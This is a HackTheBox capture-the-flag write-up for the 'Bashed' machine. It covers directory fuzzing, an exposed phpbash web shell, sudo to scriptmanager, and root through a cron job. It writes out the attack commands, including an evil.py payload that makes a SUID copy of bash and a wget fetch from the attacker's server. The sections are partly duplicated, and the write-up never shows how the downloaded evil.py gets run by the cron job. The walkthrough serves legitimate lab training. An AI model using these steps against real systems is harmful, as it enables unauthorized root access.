+++
title = "HackTheBox - Bashed Writeup"
date = "2026-04-04"
description = "Discovering phpbash via web Fuzzing and excalating to root by abusing a cron job"
tags = ["HackTheBox", "CTF", "Linux", "phpbash", "Web Fuzzing", "Cron", "SUID", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | [Bashed] |
| OS | [Linux] |


---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV [IP]
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 15:23 +0900
Nmap scan report for 10.129.12.73
Host is up (0.25s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

---

## Web Fuzzing

```bash
gobuster dir -u http://10.129.12.73 
```

```text
images               (Status: 301) [Size: 313] [--> http://10.129.12.73/images/]
js                   (Status: 301) [Size: 309] [--> http://10.129.12.73/js/]
css                  (Status: 301) [Size: 310] [--> http://10.129.12.73/css/]
uploads              (Status: 301) [Size: 314] [--> http://10.129.12.73/uploads/]
dev                  (Status: 301) [Size: 310] [--> http://10.129.12.73/dev/]
php                  (Status: 301) [Size: 310] [--> http://10.129.12.73/php/]
fonts                (Status: 301) [Size: 312] [--> http://10.129.12.73/fonts/]
```

## Web Fuzzing
 
### Gobuster
 
```bash
gobuster dir -u http://10.129.12.73 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```
 
```text
images    (Status: 301)
js        (Status: 301)
css       (Status: 301)
uploads   (Status: 301)
dev       (Status: 301)
php       (Status: 301)
fonts     (Status: 301)
```
 
The `/dev` directory stands out. Browsing to it reveals:
 
```text
phpbash.min.php   2017-12-04 12:21   4.6K
phpbash.php       2017-11-30 23:56   8.1K
```
 
---
 
## Foothold
 
### phpbash
 
Accessing `http://10.129.12.73/dev/phpbash.php` grants a web shell as `www-data`.
 
### User Flag
 
```bash
cat /home/arrexel/user.txt
```
 
---
 
## Post Exploitation
 
### sudo -l
 
```bash
sudo -l
```
 
```text
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
 
`www-data` can run any command as `scriptmanager` without a password.
 
### /scripts Directory
 
```bash
sudo -u scriptmanager ls -la /scripts
```
 
```text
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root         root          4096 Jun  2  2022 ..
-rw-r--r-- 1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root            12 Apr  4 01:08 test.txt
```
 
- `test.py` は scriptmanager 所有 → 書き換え可能
- `test.txt` は root 所有 → root が毎分 cron で `test.py` を実行している証拠
 
### test.py Contents
 
```bash
sudo -u scriptmanager cat /scripts/test.py
```
 
```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
 
---
 
## Privilege Escalation
 
### Preparing evil.py on Attack Machine
 
```bash
echo "import os" > evil.py
echo "os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')" >> evil.py
python3 -m http.server 8000
```
 
### Downloading evil.py to Target
 
```bash
sudo -u scriptmanager wget http://10.10.16.166:8000/evil.py -O /scripts/evil.py
```
 
Wait 1 minute for the root cron job to execute `evil.py`.
 
### Verify SUID Bit
 
```bash
ls -la /tmp/rootbash
```
 
```text
-rwsr-sr-x 1 root root 1037528 Apr 4 01:55 /tmp/rootbash
```
 
`s` ビットが確認できれば成功。
 
---
 
## Root Shell
 
```bash
/tmp/rootbash -p -c 'whoami'
```
 
```text
root
```
 
### Root Flag
 
```bash
/tmp/rootbash -p -c 'cat /root/root.txt'
```
 
---
 
## Summary
 
Web Fuzzing → phpbash → www-data shell → sudo as scriptmanager → cron abuse → SUID rootbash → root
 
